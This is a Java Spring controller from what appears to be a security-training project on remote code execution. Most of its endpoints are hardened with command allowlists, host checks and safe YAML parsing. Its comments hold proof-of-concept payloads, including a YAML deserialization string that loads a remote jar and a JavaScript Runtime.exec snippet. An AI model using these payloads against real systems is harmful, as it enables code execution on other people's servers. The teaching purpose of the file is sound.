package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import lombok.extern.slf4j.Slf4j;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Pattern ARITHMETIC = Pattern.compile("^\\s*(-?[0-9]{1,18})\\s*([-+*/%])\\s*(-?[0-9]{1,18})\\s*$");

    /**
     * Fixed commands selectable by key. The executed argv comes only from these constants.
     */
    private static final Map<String, String[]> COMMANDS;

    static {
        Map<String, String[]> m = new HashMap<>();
        m.put("whoami", new String[]{"whoami"});
        m.put("date", new String[]{"date"});
        m.put("uname", new String[]{"uname", "-a"});
        COMMANDS = Collections.unmodifiableMap(m);
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        String[] argv = cmd == null ? null : COMMANDS.get(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = run.exec(argv);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("Command exec failed.", e);
            return "Command exec failed!!";
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        // The request value is only a lookup key; argv comes from constants.
        String[] arrCmd = cmd == null ? null : COMMANDS.get(cmd);
        if (arrCmd == null) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error("Command exec failed.", e);
            return "Command exec failed!!";
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Only load scripts from allowlisted hosts; the URL is never concatenated into script
        // source, it is passed as a binding value instead.
        if (!SecurityUtil.checkSSRFByWhitehosts(jsurl)) {
            throw new IllegalArgumentException("jsurl is not allowed");
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.put("jsurl", jsurl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content=1+2
     * Request data is never evaluated as code; a fixed arithmetic grammar is parsed in Java.
     * @param content arithmetic expression: integer operator integer
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        if (content == null) {
            return "Bad boy. I got u.";
        }
        Matcher m = ARITHMETIC.matcher(content);
        if (!m.matches()) {
            return "Bad boy. I got u.";
        }
        long a = Long.parseLong(m.group(1));
        long b = Long.parseLong(m.group(3));
        try {
            long result;
            switch (m.group(2)) {
                case "+": result = Math.addExact(a, b); break;
                case "-": result = Math.subtractExact(a, b); break;
                case "*": result = Math.multiplyExact(a, b); break;
                case "/": result = a / b; break;
                case "%": result = a % b; break;
                default: return "Bad boy. I got u.";
            }
            return String.valueOf(result);
        } catch (ArithmeticException e) {
            return "Bad boy. I got u.";
        }
    }

    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

